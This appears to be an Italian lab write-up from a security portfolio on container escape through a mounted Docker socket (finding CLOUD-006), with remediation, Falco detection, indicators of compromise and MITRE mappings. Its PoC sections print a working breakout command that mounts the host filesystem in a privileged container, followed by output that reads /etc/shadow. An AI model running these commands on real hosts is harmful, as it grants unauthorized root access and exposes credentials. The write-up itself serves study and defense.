> [English](README.en.md) | **Italiano**

# Container Runtime Security - Escape Techniques

> - **Fase:** Cloud Security - Container Escape (Privilege Escalation)
> - **Visibilita:** Media - l'esecuzione di comandi nel container e il breakout lasciano tracce nei log del daemon e dell'host; il runtime monitoring (Falco) rileva i pattern di escape
> - **Prerequisiti:** Accesso a un container (RCE su un'app containerizzata, shell in un container); una misconfigurazione del container (socket montato, privileged, capability eccessive)
> - **Output:** Finding CLOUD-006; evasione dal container verso l'host; privilegi di root sull'host ospitante

- **Ambiente Operativo:** Docker host di laboratorio, container di test
- **Punto di partenza:** shell in un container mal configurato
- **Tool principali:** docker cli, comandi nativi, Falco (difensivo)

---

## Executive Summary

Un container non e una macchina virtuale: non c'e un hypervisor che isola completamente il guest dall'host. Un container condivide il kernel dell'host ed e isolato solo da meccanismi del kernel stesso (namespace, cgroup, capability). Questo isolamento e efficace quando il container e configurato correttamente, ma fragile quando non lo e: alcune misconfigurazioni comuni permettono di **evadere** dal container e ottenere il controllo dell'host ospitante - il "container escape".

Il finding CLOUD-006 documenta la tecnica di escape piu classica e diffusa: il montaggio del **Docker socket** (`/var/run/docker.sock`) dentro il container. Il socket e l'interfaccia di controllo del daemon Docker dell'host; un container che vi ha accesso puo comandare il daemon per creare un nuovo container privilegiato che monta l'intero filesystem dell'host, ottenendo di fatto root sull'host. Altre varianti (container `--privileged`, capability `CAP_SYS_ADMIN`, mount dell'host) portano allo stesso risultato per strade diverse.

La gravita e `Critico` perche l'escape annulla completamente l'isolamento: da un'applicazione containerizzata compromessa (magari raggiunta con un semplice RCE web) si arriva al controllo dell'host e, di li, di tutti gli altri container che vi girano. E il passaggio da "una app bucata" a "l'intero host compromesso".

---

## Struttura della cartella

```
runtime-security/
+-- README.md      # questo file: container escape techniques (CLOUD-006)
+-- img/           # breakout via docker.sock
```

---

## Container Escape via Docker Socket

**ID Finding:** `CLOUD-006` | **Severity:** `Critico` (evasione dal container e root sull'host ospitante; annulla completamente l'isolamento del container)

### Contesto operativo

Il Docker socket (`/var/run/docker.sock`) e talvolta montato dentro un container per permettergli di gestire altri container (pattern "Docker-in-Docker", CI runner, monitoring). Ma dare a un container l'accesso al socket equivale a dargli il controllo del daemon Docker dell'host - e quindi dell'host stesso, perche il daemon gira come root e puo creare container che montano qualsiasi cosa.

### PoC - Rilevamento della misconfigurazione

```Bash
# Dentro il container: il socket Docker e montato? (misconfigurazione)
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 /var/run/docker.sock   <-- socket montato: escape possibile (CLOUD-006)
```

### PoC - Escape: dal container a root sull'host

```Bash
# Dal container con il socket: creo un nuovo container privilegiato
# che monta l'intero filesystem dell'host in /host e ci eseguo una shell
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host alpine chroot /host sh
```

```
# Ora sono root sull'host, non piu nel container:
whoami
root
cat /host/etc/shadow | head -1                    <-- accesso all'host (CLOUD-006)
root:$6$...:19000:0:99999:7:::
# controllo completo dell'host ospitante e di tutti i suoi container
```

### PoC - Altre vie di escape (varianti)

```Bash
# Container privilegiato: accesso diretto ai device dell'host
# (se avviato con --privileged, si puo montare il disco dell'host)
cat /proc/1/cgroup | grep -q docker && echo "in container"
fdisk -l                    # se --privileged: i dischi dell'host sono visibili -> mount

# Capability eccessiva CAP_SYS_ADMIN o mount dell'host in /
# -> vie diverse, stesso risultato: breakout verso l'host
```

### Remediation

- **Mai montare il Docker socket** in un container non fidato; se serve la gestione dei container, usare soluzioni sicure (Docker API con TLS e permessi ristretti, rootless Docker, o socket proxy che filtra le chiamate)
- **Evitare `--privileged`:** e quasi mai necessario; concedere solo le capability specifiche richieste (`--cap-add`), mai tutte
- **Least privilege del container:** utente non-root nel container (`USER` nel Dockerfile), filesystem read-only, `no-new-privileges`, seccomp/AppArmor
- **Runtime detection:** Falco rileva in tempo reale i pattern di escape (spawn di shell, mount anomali, accesso al socket); e il controllo difensivo che rileva l'escape mentre avviene

---

## Esperienza di Laboratorio

Il container escape ha ribaltato la mia percezione dell'isolamento. Venendo dal modello delle macchine virtuali, assumevo che un container fosse una barriera solida; scoprire che condivide il kernel dell'host e che l'isolamento dipende da configurazioni corrette (e fragili) e stato un cambio di modello mentale. Un container non e una VM: e un processo isolato da meccanismi del kernel, e quei meccanismi si possono aggirare quando la configurazione li indebolisce.

Il socket Docker montato e stato l'esempio piu istruttivo perche la misconfigurazione sembra innocua. Montare `docker.sock` e un pattern comune e apparentemente pratico (il container gestisce altri container); ma equivale a consegnare le chiavi dell'host. Il breakout in tre righe - creo un container privilegiato che monta `/` e ci faccio chroot - ha reso concreta la sproporzione tra la banalita della misconfigurazione e la totalita del suo impatto. Da una shell in un container a root sull'host, senza alcun exploit, solo abusando di un accesso concesso.

La riflessione difensiva e stata sul collegamento con il resto del percorso. Un RCE su un'app web (modulo 03) che gira in un container mal configurato non resta confinato all'app: diventa, via escape, il controllo dell'host e di tutti i container vicini. L'isolamento del container, quando funziona, contiene il danno di una compromissione applicativa; quando e mal configurato, lo amplifica. La sicurezza del runtime dei container e cio che decide se un'app bucata resta un incidente locale o diventa la compromissione dell'infrastruttura.

---

## Analisi Teorica: L'Isolamento come Configurazione, non come Barriera

La differenza fondamentale tra container e VM e la natura dell'isolamento. Una VM e isolata da un hypervisor che simula hardware separato: il guest non ha, per costruzione, accesso all'host. Un container e isolato da meccanismi del kernel condiviso (namespace per la visibilita, cgroup per le risorse, capability per i privilegi): l'isolamento non e una barriera fisica ma un insieme di restrizioni configurabili. Questo rende i container leggeri ed efficienti, ma sposta la sicurezza dalla presenza di una barriera alla correttezza di una configurazione.

Ne consegue che ogni misconfigurazione che indebolisce quei meccanismi apre una via di escape. Il socket Docker aggira le restrizioni dando accesso al daemon privilegiato; `--privileged` disabilita gran parte delle restrizioni in blocco; una capability eccessiva ne rimuove una specifica ma critica. In tutti i casi, il container smette di essere isolato non perche una barriera e stata sfondata, ma perche non e mai stata eretta correttamente. L'attaccante non "rompe" l'isolamento, sfrutta un isolamento incompleto.

Questo definisce il principio di sicurezza dei container: il default deve essere il minimo privilegio, e ogni deroga (una capability in piu, il socket, privileged) va giustificata e valutata come un allentamento dell'isolamento. Il modello mentale corretto non e "il container e isolato salvo prova contraria" ma "il container e isolato solo quanto lo configuro". La difesa - utente non-root, no privileged, no socket, seccomp/AppArmor, runtime detection con Falco - e la costruzione attiva di quell'isolamento che il container non garantisce da solo.

---

## Scenario Reale: Proiezione Post-Exploitation

> Prospettiva dell'attaccante e del difensore in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** root sull'host Docker ottenuto via escape da un container mal configurato (CLOUD-006).

**Kill Chain proiettata:**

```
[RCE su app web containerizzata (modulo 03)] -> shell nel container
        |
        v
[CLOUD-006] docker.sock montato -> escape -> root sull'host
        |
        v
Controllo di tutti i container sull'host (altri servizi, altri dati)
        |
        v
Accesso alle credenziali/segreti montati nei container -> pivot
        |
        v
Compromissione dell'infrastruttura host + lateral movement
```

**Impatto potenziale:** l'escape trasforma la compromissione di una singola applicazione nel controllo dell'host e di tutto cio che vi gira. In un ambiente dove piu servizi condividono lo stesso host Docker, un escape da uno solo espone tutti gli altri - i loro dati, i loro segreti, le loro credenziali. Il collegamento con il modulo 03 e diretto: un RCE web, contenuto se il container e sicuro, diventa la compromissione dell'infrastruttura se il container permette l'escape.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** Falco rileva in tempo reale i pattern di escape - spawn di shell in un container, accesso al Docker socket, mount anomali, esecuzione di `docker run` dall'interno di un container. Il runtime monitoring e il controllo chiave perche l'escape avviene a runtime, non alla build.

**Indicatori di Compromissione (IOC):**
- Accesso a `/var/run/docker.sock` dall'interno di un container
- Creazione di container privilegiati o con mount di `/` (chiamate al daemon anomale)
- Spawn di shell (`sh`/`bash`) in container che non dovrebbero averne
- Processi che escono dal namespace del container

**Contenimento e hardening:**
- Rimozione del socket dai container; `--privileged` proibito; capability minime
- Utente non-root nei container, filesystem read-only, `no-new-privileges`, seccomp/AppArmor
- Falco (o equivalente) per la detection a runtime
- Segmentazione: non far condividere lo stesso host a workload con livelli di fiducia diversi

**Lezione difensiva:** l'isolamento del container e una configurazione, non una garanzia. La difesa richiede sia la prevenzione (configurazione a minimo privilegio, nessuna deroga ingiustificata) sia la detection a runtime (Falco), perche una misconfigurazione sfuggita alla prima linea deve essere colta dalla seconda. Un container non fidato non deve mai avere cio che gli permette di evadere - e se ce l'ha, l'escape va rilevato mentre accade.

---

## Tool di riferimento

| Tool | Tipo | Ruolo | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `docker cli` | Container CLI | Ufficiale | Interazione con il daemon (anche via socket abusato) |
| `Falco` | Runtime security | Difensivo | Detection in tempo reale dei pattern di escape |
| `amicontained` | Container recon | Analisi | Verifica di capability, seccomp, namespace del container |
| `deepce` | Escape enumeration | Offensivo | Enumerazione automatica delle vie di escape |
| `AppArmor`/`seccomp` | Sandbox | Difensivo | Restrizione delle syscall e delle capability |

> **Tool moderno consigliato:** offensivamente `deepce` (Docker Enumeration and Escape) automatizza la scoperta delle vie di escape. Difensivamente `Falco` e lo standard per la runtime detection dei container, con regole native per gli escape. `amicontained` per verificare rapidamente la postura di sicurezza di un container.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Privilege Escalation | Escape to Host | `T1611` | Escape dal container all'host via Docker socket (CLOUD-006) |
| Execution | Deploy Container | `T1610` | Creazione di un container privilegiato per il breakout (CLOUD-006) |
| Discovery | Container and Resource Discovery | `T1613` | Enumerazione dei container e delle misconfigurazioni |
| Lateral Movement | (host) verso altri container | `T1611` | Dall'host compromesso al controllo degli altri container |

| Contromisura difensiva (D3FEND) | ID D3FEND | Applicazione |
| :--- | :--- | :--- |
| Process Spawn Analysis | `D3-PSA` | Falco rileva lo spawn anomalo di shell/processi |
| Mandatory Access Control | `D3-MAC` | seccomp/AppArmor restringono le capacita del container |

---

> **Nota:** Tutte le attivita documentate sono state condotte su host e container Docker di laboratorio di proprieta dell'autore. Il container escape su infrastrutture di terzi senza autorizzazione costituisce reato. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
